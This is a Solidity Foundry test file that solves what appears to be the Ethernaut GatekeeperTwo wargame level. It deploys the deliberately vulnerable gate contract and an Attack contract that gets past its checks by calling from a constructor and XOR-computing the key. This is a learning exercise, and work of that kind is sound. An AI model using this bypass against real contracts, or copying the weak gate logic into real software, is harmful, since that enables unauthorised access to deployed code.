
pragma solidity ^0.6.0;

import "forge-std/Test.sol";

contract GatekeeperTwo is Test {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin, "err1");
        _;
    }

    modifier gateTwo() {
        uint x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0, "err2");
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        emit log_named_uint("part1", uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))));

        require(
            uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^
                uint64(_gateKey) ==
                uint64(0) - 1, "err3"
        );
        _;
    }

    function enter(bytes8 _gateKey)
        public
        gateOne
        gateTwo
        gateThree(_gateKey)
        returns (bool)
    {
        entrant = tx.origin;
        return true;
    }
}

contract Attack is Test {
    constructor() public {
        GatekeeperTwo gk = new GatekeeperTwo();
        address g = address(gk);
        
        bytes4 sig = bytes4(keccak256("enter(bytes8)"));
        log_named_bytes("first method",  abi.encode(sig, key()));
        log_named_bytes("second method", abi.encodePacked(sig, key()));
        log_named_bytes("third method",  abi.encodeWithSignature("enter(bytes8)", key()));

        (bool success, ) = g.call(abi.encodePacked(sig, key()));
        require(success);
    }

    function key() private returns (bytes8) {
        uint64 val = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^
            (type(uint64).max);
        return bytes8(val);
    }
}

contract ContractTest is Test {
    function setUp() public {}

    function testExample() public {
        new Attack();
    }
}
